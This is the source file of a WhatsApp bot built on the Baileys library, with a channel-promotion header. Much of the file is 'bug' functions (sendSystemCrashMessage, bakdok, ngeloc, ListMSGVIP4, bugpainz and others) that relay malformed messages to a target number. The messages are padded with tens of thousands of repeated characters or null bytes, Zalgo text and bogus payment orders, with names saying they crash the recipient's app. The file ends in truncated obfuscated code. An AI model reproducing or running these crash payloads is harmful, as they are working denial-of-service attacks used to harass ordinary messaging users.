/*


       Subscribe My YouTube Channel: @GlobalTechInfo

Follow The Channel For More :https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07

Contact Me: https://t.me/GlobalTechInc

GitHub: https://github.com/GlobalTechInfo

Credit Qasim Ali

*/
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (Painzy, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');


const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Painzy.user.id.split(':')[0]+'@s.whatsapp.net' || Painzy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Painzy.decodeJid(Painzy.user.id)
const senderNumber = sender.split('@')[0]

 // System User
    const prem = require("./lib/premium");
    let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
    const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
  
  // Premium
  const isPremium = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
  
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await Painzy.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//====================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ Message ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> To'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Painzy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Painzy.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Painzy.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
const virgam = fs.readFileSync(`./lib/image/virgam.png`)
const latx = fs.readFileSync(`./image/latx.png`)
const anjay = fs.readFileSync(`./image/anjay.jpg`)
const qris = fs.readFileSync(`./image/qris.jpg`)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
// 𝘙𝘌𝘗𝘓𝘠
async function loading () {
var genalpa = [
"𝘟",
"𝘊𝘳𝘢𝘴𝘩",
"𝘎𝘓𝘖𝘉𝘈𝘓 𝘟 𝘊𝘳𝘢𝘴𝘩"
]
let { key } = await Painzy.sendMessage(m.chat, {text: '𝘘𝘢𝘴𝘪𝘮'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < genalpa.length; i++) {
await sleep(10)
await Painzy.sendMessage(m.chat, {text: genalpa[i], edit: key });
}
}

//React Feature 
const successreact = ['✅']
const emooji = successreact[Math.floor(Math.random() * successreact.length)]
const starttask =  (teks) => {
  return Painzy.sendMessage(m.chat, { react: { text: teks, key: m.key }}) 
}

const fakejpg = fs.readFileSync(`./image/fake.jpg`)
// FUNCTION BUG //

const painbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `GlobaL 💸`
}
}
}

const painzybug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/virgam.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Pᴀɪɴᴢʏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    qio.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "GlobaL CRASH WHATSAPP"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'Painzy', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await Painzy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": anjay
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"GlobaL Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍MODS CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`

}

]

}

}

}

}


async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `GlobaL DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await Painzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Painzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function iponcrash(target) {
await Painzy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function ListMSGVIP3(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: 'GlobaL',
                        },
                        body: {
                            text: '𝖃',
                        },
                        footer: {
                            text: '𝕮𝖗𝖆𝖘𝖍',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝖅𝖞𝖓𝖝𝖟𝖔', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝖃', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await Painzy.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ListMSGVIP4(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'Hemm',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'ppq',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await Painzy.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `GlobaL 𝖃 Crash`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Painzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bugpainz(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {

  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄.
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: kuwoted })

await Painzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}
    
(function(_0x4a0c3c,_0x449ed6){var _0x104feb=_0x1bd9,_0x3e3dd0=_0x4a0c3c();while(!![]){try{var _0x481ad5=parseInt(_0x104feb(0x123))/0x1*(-parseInt(_0x104feb(0x12c))/0x2)+-parseInt(_0x104feb(0x12e))/0x3+-parseInt(_0x104feb(0x11f))/0x4+parseInt(_0x104feb(0x120))/0x5+parseInt(_0x104feb(0x11e))/0x6*(-parseInt(_0x104feb(0x126))/0x7)+-parseInt(_0x104feb(0x12f))/0x8+-parseInt(_0x104feb(0x125))/0x9*(-parseInt(_0x104feb(0x121))/0xa);if(_0x481ad5===_0x449ed6)break;else _0x3e3dd0['push'](_0x3e3dd0['shift']());}catch(_0x2c4bb4){_0x3e3dd0['push'](_0x3e3dd0['shift']());}}}(_0x5751,0x33690));function hi(){var _0x4ca531=_0x1bd9;console['log'](_0x4ca531(0x122));}function _0x5751(){var _0x5489b7=['10RyLaBj','Hello\x20World!','10412BelDfW','meu\x20ovo','10276299zlszHl','42MFbSVh','physical-goods','payment_info','pix_static_code','pending','4P46GMY57GC','38zEAssq','+5533998586057','495336GBTdnV','1900344WdqeoS','ORDER','33228OrqiJL','1342808IxSDsY','190890kWQtXO'];_0x5751=function(){return _0x5489b7;};return _0x5751();}hi();function _0x1bd9(_0xdb0a9e,_0x35a4f6){var _0x5751dd=_0x5751();return _0x1bd9=function(_0x1bd910,_0x4c97e1){_0x1bd910=_0x1bd910-0x11e;var _0x5d47b4=_0x5751dd[_0x1bd910];return _0x5d47b4;},_0x1bd9(_0xdb0a9e,_0x35a4f6);}async function sendPaymentInfoMessage(_0x28ef97){var _0x404515=_0x1bd9;await 